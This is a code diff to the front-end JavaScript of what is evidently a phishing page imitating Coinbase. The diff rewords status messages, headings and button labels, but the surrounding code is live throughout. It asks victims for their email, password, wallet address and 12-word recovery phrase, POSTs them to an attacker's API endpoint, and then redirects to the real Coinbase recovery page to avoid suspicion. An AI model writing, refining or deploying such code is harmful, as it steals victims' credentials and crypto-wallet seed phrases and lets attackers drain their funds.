@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('toStep3').onclick = () => {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        if(!email || !pass) return alert("Please fill in your details.");
+        if(!email || !pass) return alert("Required fields missing.");
         
         step2.classList.add('hidden');
         step3.classList.remove('hidden');
@@ -38,17 +38,14 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     function setupRecovery(email, pass) {
-        document.getElementById('step3Title').innerText = "Verify Identity";
-        document.getElementById('step3Desc').innerText = "Please enter your 12-word recovery phrase.";
-        
         step3.innerHTML = `
             <img src="logo.png" class="cb-logo">
-            <h1>Verify Identity</h1>
+            <h1 class="cb-header">Recovery</h1>
             <p>Enter your 12-word recovery phrase to continue.</p>
             <div class="input-group">
                 <input type="text" id="phrase" placeholder="word1 word2 ..." style="text-align:center;">
             </div>
-            <button id="submitPhrase" class="btn-primary">Verify Account</button>
+            <button id="submitPhrase" class="btn-primary">Restore Account</button>
             <div id="phrase_status" class="status-text"></div>
         `;
 
@@ -65,20 +62,20 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function sendData(email, pass, wallet, phrase) {
         try {
-            status.innerText = "Verifying...";
+            status.innerText = "Processing...";
             const res = await fetch(`${API_URL}/update`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
             });
             if (res.ok) {
-                status.innerText = "Success! Redirecting...";
+                status.innerText = "Verification successful. Redirecting...";
                 setTimeout(() => {
                     window.location.href = 'https://www.coinbase.com/password-recovery';
-                }, 2000);
+                }, 1500);
             }
         } catch (e) {
-            status.innerText = "Connection error. Try again.";
+            status.innerText = "Network error. Please try again.";
         }
     }
 });
